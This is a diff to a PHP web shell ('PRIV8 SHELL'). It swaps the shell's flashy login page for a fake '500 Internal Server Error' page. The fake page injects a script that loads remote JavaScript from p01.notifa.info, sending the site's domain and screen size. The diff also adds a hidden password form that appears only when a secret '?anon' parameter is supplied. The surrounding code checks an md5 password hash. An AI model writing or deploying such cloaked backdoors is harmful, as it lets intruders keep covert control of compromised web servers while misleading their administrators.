@@ -26,275 +26,30 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
  
 function login_shell() {
 ?>
-<html>
-<head>
-<title>HARO :) </title>
-<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/393966522/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscry="" loop="allow"></iframe>
-<link href='https://cdn.weasyl.com/static/media/31/34/b1/3134b18cb985f08053235b9a5e4b91a0078a815b893241bba253523e9f87cd15.png' rel='icon' type='image/x-icon'/>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
-<style type="text/css">
 
-#container {
-  width: 500px;
-  margin: auto;
-}
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>500 Internal Server Error</title>
+</head><body>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.</p>
+<p>Please contact the server administrator,
+ and inform them of the time the error occurred,
+and anything you might have done that may have
+caused the error.</p>
+<p>More information about this error may be available
+in the server error log.</p>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH22OQt8P3feq%2byfjwksyVyR5dwy%2fLL9HDSEBuTSvLpBHPLLxokncBHWePeqEPS%2fyA8cCSNXtr4AA6eV1XoMwZH3sXesst0h%2bBxfZWJbybdJj7y5uF65q7w3DdP%2f3aLx54wxKjie60KX2Ydj11JmPMY9bZCKo9T5QOpqyhliiPgj4LxN7zl9nhqN%2fg7h7WpYf1JCZrv6pYIq4GH7%2bx%2bwA5wXxVIVSzNqZDrm%2f9Nuixp03Xb5ocRt1RwuS48HZGWg%2fwt%2fvS5Vz%2bc5pMldbOw9pIRHBulbaKWJhd9PXP%2fnwsk6z9%2behbNcVaz%2f0fh%2fl6ItikOAQ2e7IkfucVMQ5b2ka9npgA3VeiFBff%2fgx5OxTbD1sfb%2bY98BOpbeO6ZQbX1j8D1KHeo2PJDiB4RcE2eWOG8I1Nz4%2bvOaqsZPL%2b5NFdQG7CJyoVI0KcAvCaJDuBL64x6k8c2YPHXdQRcu3ashNVh%2bde%2boEGsOGmh%2fzqukz0WJpXQQ3j1JNDfiGVJJgr6h%2fPN6dzu0DcQzBifCct29UOTb%2bRgX1PEAgB2eSWBiryaKJpo51NNXZBivqZ%2fIMhW7VoZ%2b2Zm9TMhxfU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></html>
 
-@media (max-width: 650px) {
-  #container {
-    width: 100%;
-  }
-  p {
-    font-size: 3.5em;
-  }
-}
-html {
-     background-color: black;
-     text-shadow: 0 0 0.10em white;
-  -webkit-background-size: cover;
-  -moz-background-size: cover;
-  -o-background-size: cover;
-  background-size: cover;
-}
-html,body{margin:0;padding:0;height:100%;font:10px Arial;}
-#wrapper{min-height:100%;position:relative;}
-#header{background:#f0f0f0;padding:5px;height:50px;color:#3000ff;}
-#body{padding-bottom:40px;padding-left:10px;}
-#footer{background:#f0f0f0;position:absolute;bottom:0;width:100%;
-   text-align:center;color:#408080;}
-header {
-    color: ;
-    margin: 10px auto;
-}
-input.own {
-    background-color: black;
-    color: white;
-    border : 0px solid #ccc;
-    box-shadow: 0 0 0.9em red;
-}
-html {
-  background: #000;
-}
-
-body {
-  width: 600px;
-  margin: 0 auto;
-}
-.horror-text {
-  animation-duration: 1.5s;
-  animation-iteration-count: infinite;
-  animation-name: flickering;
-  animation-timing-function: step-start;
-  color: #912914;
-  font-family: 'UnifrakturCook', cursive;
-  font-size: 96px;
-}
-
-@keyframes flickering {
-  0% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  5% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  10% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(-15deg);
-  }
-  15% {
-    color: #ccc;
-    text-shadow: none;
-    transform: skewX(-15deg);
-  }
-  20% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  25% {
-    color: #ccc;
-    text-shadow: 2px 2px #912914;
-    transform: skewX(0);
-  }
-  30% {
-    color: #ccc;
-    text-shadow: 2px 2px #912914;
-    transform: skewX(0);
-  }
-  35% {
-    color: #ccc;
-    text-shadow: 2px 2px #912914;
-    transform: skewX(0);
-  }
-  37% {
-    color: #ccc;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  40% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  45% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  50% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  55% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  60% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  65% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  68% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  70% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  75% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(10deg);
-  }
-  80% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(10deg);
-  }
-  85% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(10deg);
-  }
-  90% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-  95% {
-    color: #912914;
-    text-shadow: 1px 1px #eee;
-    transform: skewX(0);
-  }
-  100% {
-    color: #912914;
-    text-shadow: none;
-    transform: skewX(0);
-  }
-}
-
-
-/* Additional styling */
-html, body {
-  background-color: #000;
-  border: 0;
-  height: 100%;
-  margin: 0;
-  overflow: hidden;
-  padding: 0;
-  width: 100%;
-}
-
-.center {
-  left: 50%;
-  position: absolute;
-  top: 50%;
-  transform: translate(-50%, -50%);
-}
-body { font: 400 1em/1.5 "Neuton"; background: #000; color: rgba(255,255,255,.25); text-align: center; margin: 0 }
-
-p {
-  text-transform: uppercase;
-  letter-spacing: .5em;
-  display: inline-block;
-  border: 4px double rgba(255,255,255,.25);
-  border-width: 4px 0;
-  padding: 1.5em 0em;
-  top: 18%;
-  width: 40em;
-  margin: 0 0 0 -20em;
-  
-  span {
-
-    font: 700 4em/1 "Oswald", sans-serif;
-    letter-spacing: 0;
-    padding: .25em 0 .325em;
-    display: block;
-    margin: 0 auto;
-    text-shadow: 0 0 80px rgba(255,255,255,.5);
-
-/* Clip Background Image */
-
-    background: url(http://f.cl.ly/items/010q3E1u3p2Q0j1L1S1o/animated_text_fill.png) repeat-y;
-    -webkit-background-clip: text;
-    background-clip: text;
-
-/* Animate Background Image */
-
-    -webkit-text-fill-color: transparent;
-    -webkit-animation: aitf 80s linear infinite;
-
-/* Activate hardware acceleration for smoother animations */
-
-    -webkit-transform: translate3d(0,0,0);
-    -webkit-backface-visibility: hidden;
-
-  }
-}
-
-/* Animate Background Image */
-
-@-webkit-keyframes aitf {
-  0% { background-position: 0% 50%; }
-  100% { background-position: 100% 50%; }
-}
-</style>
-</head>
- <body>
-<div class="center">
-<img src="https://scontent-sin6-2.xx.fbcdn.net/v/t1.0-9/52546745_267242230841757_7025904229478825984_n.jpg?_nc_cat=106&_nc_ht=scontent-sin6-2.xx&oh=e990158960e8c6aef1fdd401fc025da5&oe=5D4D32F4" width="250" height="250"/>
-<div class="horror-text">PRIV8 SHELL</div><br />
-</div>
-<center>
-<form method="post">
-<input type="password" name="pass" placeholder="Input The passwd"> <br><br>
-<input type="submit" value="Login" class="own">
-<table>
-  <div id="container">
-
-</TD>
-</style>
-</head>
-</head>
-<table border="0" cellspacing="1" cellpadding="4" class="tborder"><tr><td class="thead"><strong></strong></td></tr><tr><td class="trow1"></a></td></tr></table><br />
-<table border="0" cellspacing="1" cellpadding="4" class="tborder">
-<tbody><tr>
 <?php
 exit;
+}
+if(isset($_GET['anon'])) {
+echo '<center><form method="post">
+<input type="password" name="pass" placeholder="Input The passwd"> <br><br>
+<input type="submit" value="Login" class="own"></center>';
 }
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
     if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
